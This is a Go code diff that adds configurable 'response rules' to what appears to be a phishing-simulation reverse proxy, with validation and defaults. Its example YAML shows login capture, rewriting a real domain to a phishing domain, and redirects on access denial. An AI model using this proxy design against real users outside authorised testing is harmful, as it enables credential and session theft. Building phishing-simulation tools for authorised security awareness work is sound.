@@ -40,18 +40,20 @@ type ProxyServiceConfig struct {
 
 // ProxyServiceDomainConfig represents configuration for a specific domain mapping
 type ProxyServiceDomainConfig struct {
-	To      string                     `yaml:"to"`
-	Access  *ProxyServiceAccessControl `yaml:"access,omitempty"`
-	Capture []ProxyServiceCaptureRule  `yaml:"capture,omitempty"`
-	Rewrite []ProxyServiceReplaceRule  `yaml:"rewrite,omitempty"`
+	To       string                     `yaml:"to"`
+	Access   *ProxyServiceAccessControl `yaml:"access,omitempty"`
+	Capture  []ProxyServiceCaptureRule  `yaml:"capture,omitempty"`
+	Rewrite  []ProxyServiceReplaceRule  `yaml:"rewrite,omitempty"`
+	Response []ProxyServiceResponseRule `yaml:"response,omitempty"`
 }
 
 // ProxyServiceRules represents capture and replace rules
 // ProxyServiceRules represents global rules that apply to all hosts
 type ProxyServiceRules struct {
-	Access  *ProxyServiceAccessControl `yaml:"access,omitempty"`
-	Capture []ProxyServiceCaptureRule  `yaml:"capture,omitempty"`
-	Rewrite []ProxyServiceReplaceRule  `yaml:"rewrite,omitempty"`
+	Access   *ProxyServiceAccessControl `yaml:"access,omitempty"`
+	Capture  []ProxyServiceCaptureRule  `yaml:"capture,omitempty"`
+	Rewrite  []ProxyServiceReplaceRule  `yaml:"rewrite,omitempty"`
+	Response []ProxyServiceResponseRule `yaml:"response,omitempty"`
 }
 
 // ProxyServiceAccessControl represents access control configuration
@@ -67,12 +69,21 @@ type ProxyServiceDenyResponse struct {
 	WithoutSession string `yaml:"without_session"` // "allow" | "redirect:URL" | status code
 }
 
-// CompilePathPatterns compiles regex patterns for all capture rules
+// CompilePathPatterns compiles regex patterns for all capture and response rules
 func CompilePathPatterns(config *ProxyServiceConfigYAML) error {
 	// Compile global capture rule patterns
 	if config.Global != nil && config.Global.Capture != nil {
 		for i := range config.Global.Capture {
 			if err := compileCapturePath(&config.Global.Capture[i]); err != nil {
+				return err
+			}
+		}
+	}
+
+	// Compile global response rule patterns
+	if config.Global != nil && config.Global.Response != nil {
+		for i := range config.Global.Response {
+			if err := compileResponsePath(&config.Global.Response[i]); err != nil {
 				return err
 			}
 		}
@@ -87,6 +98,29 @@ func CompilePathPatterns(config *ProxyServiceConfigYAML) error {
 				}
 			}
 		}
+	}
+
+	// Compile host-specific response rule patterns
+	for _, hostConfig := range config.Hosts {
+		if hostConfig != nil && hostConfig.Response != nil {
+			for i := range hostConfig.Response {
+				if err := compileResponsePath(&hostConfig.Response[i]); err != nil {
+					return err
+				}
+			}
+		}
+	}
+	return nil
+}
+
+// compileResponsePath compiles the path pattern for a response rule
+func compileResponsePath(rule *ProxyServiceResponseRule) error {
+	if rule.Path != "" {
+		pathRe, err := regexp.Compile(rule.Path)
+		if err != nil {
+			return fmt.Errorf("invalid regex pattern for response path '%s': %w", rule.Path, err)
+		}
+		rule.PathRe = pathRe
 	}
 	return nil
 }
@@ -122,9 +156,97 @@ type ProxyServiceReplaceRule struct {
 	From    string `yaml:"from,omitempty"`
 }
 
+// ProxyServiceResponseRule represents a response rule that allows custom responses for specific paths
+//
+// COMPLETE PROCESSING ORDER & PRECEDENCE:
+// The proxy processes rules in this exact order:
+//
+// REQUEST PROCESSING:
+// 1. Response rules (FIRST) - can short-circuit everything
+// 2. Session creation/loading (SECOND) - creates session ID internally
+// 3. Access control (THIRD) - can block forwarding (uses session existence)
+// 4. Capture rules on request (headers, body, cookies)
+// 5. Rewrite rules on request (URL params, body patching)
+// 6. Request forwarded to target server
+//
+// RESPONSE PROCESSING:
+// 7. Session cookie setting (for new sessions) - cookie sent to client
+// 8. Capture rules on response (headers, body, cookies)
+// 9. Rewrite rules on response (headers, body, URL replacement)
+// 10. Final response returned to client
+//
+// PRECEDENCE RULES:
+// - Response rules with forward: false → skip ALL other processing
+// - Response rules with forward: true → capture/rewrite still apply
+// - Session created before access control (affects hasSession logic)
+// - Access control can block forwarding even with pending response
+// - Cookie only set in response phase (not during session creation)
+// - Capture rules always run (unless response rule short-circuits)
+// - Rewrite rules always run (unless response rule short-circuits)
+//
+// PRACTICAL EXAMPLES:
+//
+// Example 1 - Fake API endpoint (response rule wins, bypasses everything):
+//
+//	response:
+//	  - path: "^/api/status$"
+//	    body: '{"status": "ok"}'
+//	    forward: false
+//	access:
+//	  mode: "deny"
+//	  paths: ["^/api/status$"]
+//	capture:
+//	  - name: "api_data"
+//	    path: "^/api/status$"
+//	Result: Returns {"status": "ok"} immediately, no access control, no capture, no forwarding
+//
+// Example 2 - Monitor + fake response (response + access rules apply):
+//
+//	response:
+//	  - path: "^/api/status$"
+//	    body: '{"status": "ok"}'
+//	    forward: true
+//	access:
+//	  mode: "deny"
+//	  paths: ["^/api/status$"]
+//	capture:
+//	  - name: "api_data"
+//	    path: "^/api/status$"
+//	Result: Creates session → captures request data → returns {"status": "ok"} → sets cookie → NOT forwarded (access blocks it)
+//
+// Example 3 - Full pipeline (all rules apply):
+//
+//	response:
+//	  - path: "^/api/status$"
+//	    body: '{"status": "ok"}'
+//	    forward: true
+//	access:
+//	  mode: "allow"
+//	  paths: ["^/api/"]
+//	capture:
+//	  - name: "api_data"
+//	    path: "^/api/status$"
+//	rewrite:
+//	  - find: "original.com"
+//	    replace: "phishing.com"
+//	Result: Creates session → captures data → rewrites content → forwards to target → captures response → sets cookie → ignores custom response
+//
+// RESPONSE RULE FEATURES:
+// - forward: false (default) → replace normal proxy behavior
+// - forward: true → provide response while still attempting to forward
+// - Body content is used as-is (plain text/HTML/JSON/etc.)
+type ProxyServiceResponseRule struct {
+	Path    string            `yaml:"path"`    // regex pattern for request path
+	Status  int               `yaml:"status"`  // HTTP status code (default: 200)
+	Headers map[string]string `yaml:"headers"` // response headers to set
+	Body    string            `yaml:"body"`    // response body content (supports template variables)
+	Forward bool              `yaml:"forward"` // whether to also forward requesto target (default: false)
+	PathRe  *regexp.Regexp    `yaml:"-"`       // compiled regex for path matching
+}
+
 // ProxyServiceConfigYAML represents the complete YAML configuration structure that matches the actual YAML format
 //
-// Example YAML configuration with access control:
+// Example YAML configuration with access control and response rules:
 //
 // version: "0.0"
 // global:
@@ -141,6 +263,12 @@ type ProxyServiceReplaceRule struct {
 //	capture:
 //	  - name: "global_navigation"
 //	    path: "/important"
+//	response:
+//	  - path: "^/favicon\\.ico$"
+//	    headers:
+//	      Content-Type: "image/x-icon"
+//	    body: "base64:AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAAA=="
+//	    forward: false
 //
 // example.com:
 //
@@ -154,6 +282,19 @@ type ProxyServiceReplaceRule struct {
 //	  on_deny:
 //	    with_session: "redirect:https://phishing-example.com/"
 //	    without_session: 503
+//	response:
+//	  - path: "^/robots\\.txt$"
+//	    headers:
+//	      Content-Type: "text/plain"
+//	    body: |
+//	      User-agent: *
+//	      Disallow: /
+//	    forward: false
+//	  - path: "^/api/health$"
+//	    headers:
+//	      Content-Type: "application/json"
+//	    body: '{"status": "ok", "timestamp": "{{timestamp}}"}'
+//	    forward: true
 //	capture:
 //	  - name: "login_capture"
 //	    method: "POST"
@@ -478,6 +619,11 @@ func (m *Proxy) validateProxyConfigForUpdate(ctx context.Context, proxy *model.P
 	// set default values
 	m.setProxyConfigDefaults(&config)
 
+	// compile regex patterns for capture and response rules
+	if err := CompilePathPatterns(&config); err != nil {
+		return validate.WrapErrorWithField(err, "proxyConfig")
+	}
+
 	// validate version (after defaults are applied)
 	if err := ValidateVersion(&config); err != nil {
 		return validate.WrapErrorWithField(err, "proxyConfig")
@@ -579,6 +725,10 @@ func (m *Proxy) validateProxyConfigForUpdate(ctx context.Context, proxy *model.P
 			return err
 		}
 		if err := m.validateReplaceRules(config.Global.Rewrite); err != nil {
+			return err
+		}
+		// validate global response rules
+		if err := m.validateResponseRules(config.Global.Response); err != nil {
 			return err
 		}
 	}
@@ -692,6 +842,60 @@ func (m *Proxy) validateCaptureRules(captureRules []ProxyServiceCaptureRule) err
 	return nil
 }
 
+// validateResponseRules validates response rules configuration
+func (m *Proxy) validateResponseRules(responseRules []ProxyServiceResponseRule) error {
+	for i, rule := range responseRules {
+		// validate path is not empty
+		if rule.Path == "" {
+			return validate.WrapErrorWithField(
+				errors.New(fmt.Sprintf("response rule at index %d must have a path", i)),
+				"proxyConfig",
+			)
+		}
+
+		// validate regex pattern
+		if _, err := regexp.Compile(rule.Path); err != nil {
+			return validate.WrapErrorWithField(
+				errors.New(fmt.Sprintf("response rule at index %d has invalid regex pattern '%s': %v", i, rule.Path, err)),
+				"proxyConfig",
+			)
+		}
+
+		// validate status code if specified
+		if rule.Status != 0 {
+			if rule.Status < 100 || rule.Status > 599 {
+				return validate.WrapErrorWithField(
+					errors.New(fmt.Sprintf("response rule at index %d has invalid status code %d (must be 100-599)", i, rule.Status)),
+					"proxyConfig",
+				)
+			}
+		}
+
+		// validate headers
+		for headerName, headerValue := range rule.Headers {
+			if headerName == "" {
+				return validate.WrapErrorWithField(
+					errors.New(fmt.Sprintf("response rule at index %d has empty header name", i)),
+					"proxyConfig",
+				)
+			}
+			if strings.Contains(headerName, ":") || strings.Contains(headerName, "\n") || strings.Contains(headerName, "\r") {
+				return validate.WrapErrorWithField(
+					errors.New(fmt.Sprintf("response rule at index %d has invalid header name '%s'", i, headerName)),
+					"proxyConfig",
+				)
+			}
+			if strings.Contains(headerValue, "\n") || strings.Contains(headerValue, "\r") {
+				return validate.WrapErrorWithField(
+					errors.New(fmt.Sprintf("response rule at index %d has invalid header value for '%s'", i, headerName)),
+					"proxyConfig",
+				)
+			}
+		}
+	}
+	return nil
+}
+
 // setProxyConfigDefaults sets default values for Proxy configuration after YAML parsing
 func (m *Proxy) setProxyConfigDefaults(config *ProxyServiceConfigYAML) {
 	// set default version to 0.0 if not specified
@@ -713,6 +917,15 @@ func (m *Proxy) setProxyConfigDefaults(config *ProxyServiceConfigYAML) {
 				}
 			}
 		}
+		if domainConfig != nil && domainConfig.Response != nil {
+			for i := range domainConfig.Response {
+				// set default status to 200 if not specified
+				if domainConfig.Response[i].Status == 0 {
+					domainConfig.Response[i].Status = 200
+				}
+				// set default forward to false if not specified (forward is already false by default for bool)
+			}
+		}
 		config.Hosts[domain] = domainConfig
 	}
 
@@ -728,6 +941,17 @@ func (m *Proxy) setProxyConfigDefaults(config *ProxyServiceConfigYAML) {
 			if config.Global.Capture[i].From == "" {
 				config.Global.Capture[i].From = "any"
 			}
+		}
+	}
+
+	// set defaults for global response rules
+	if config.Global != nil && config.Global.Response != nil {
+		for i := range config.Global.Response {
+			// set default status to 200 if not specified
+			if config.Global.Response[i].Status == 0 {
+				config.Global.Response[i].Status = 200
+			}
+			// set default forward to false if not specified (forward is already false by default for bool)
 		}
 	}
 }
@@ -869,6 +1093,11 @@ func (m *Proxy) validateProxyConfig(ctx context.Context, proxy *model.Proxy) err
 	// set default values
 	m.setProxyConfigDefaults(&config)
 
+	// compile regex patterns for capture and response rules
+	if err := CompilePathPatterns(&config); err != nil {
+		return validate.WrapErrorWithField(err, "proxyConfig")
+	}
+
 	// validate version (after defaults are applied)
 	if err := ValidateVersion(&config); err != nil {
 		return validate.WrapErrorWithField(err, "proxyConfig")
@@ -996,6 +1225,11 @@ func (m *Proxy) validateProxyConfig(ctx context.Context, proxy *model.Proxy) err
 			return err
 		}
 
+		// validate response rules
+		if err := m.validateResponseRules(domainConfig.Response); err != nil {
+			return err
+		}
+
 		// validate that phishing domain is not used by another proxy
 		if err := m.validatePhishingDomainUniquenessByStartURL(ctx, domainConfig.To, proxy.StartURL.MustGet().String()); err != nil {
 			return err
@@ -1011,6 +1245,10 @@ func (m *Proxy) validateProxyConfig(ctx context.Context, proxy *model.Proxy) err
 			return err
 		}
 		if err := m.validateReplaceRules(config.Global.Rewrite); err != nil {
+			return err
+		}
+		// validate global response rules
+		if err := m.validateResponseRules(config.Global.Response); err != nil {
 			return err
 		}
 	}
